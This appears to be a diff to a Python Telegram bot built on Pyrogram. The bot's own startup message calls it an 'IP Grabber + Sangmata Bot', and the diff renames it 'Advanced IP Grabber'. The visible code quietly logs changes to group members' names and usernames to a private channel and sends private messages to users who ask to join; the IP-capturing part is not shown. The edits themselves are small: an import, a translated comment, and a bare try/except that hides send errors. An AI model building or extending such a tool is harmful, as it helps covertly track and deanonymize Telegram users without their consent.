@@ -1,6 +1,7 @@
 import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from datetime import datetime
 
 # === YOUR DATA ===
 API_ID = 32696327
@@ -37,7 +38,7 @@ async def handle_join_request(client, request):
     except Exception as e:
         print(f"❌ Failed to send PM to {user_id}: {e}")
 
-# Sangmata Tracker (hanya kirim ke LOG CHANNEL)
+# Sangmata Tracker - ONLY send to LOG CHANNEL
 @app.on_message(filters.group)
 async def sangmata_tracker(client, message):
     if not message.from_user:
@@ -71,13 +72,15 @@ async def sangmata_tracker(client, message):
 {"\n".join(changes)}
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
         """
-        await client.send_message(LOG_CHANNEL, log_text)   # ← Hanya ke log channel
+        try:
+            await client.send_message(LOG_CHANNEL, log_text)
+        except:
+            pass
 
-    # Update data
     user_history[user_id] = {
         "first_name": user.first_name,
         "username": user.username
     }
 
-print("✅ IP Grabber + Sangmata Bot is running...")
+print("✅ Advanced IP Grabber + Sangmata Bot is running...")
 app.run()
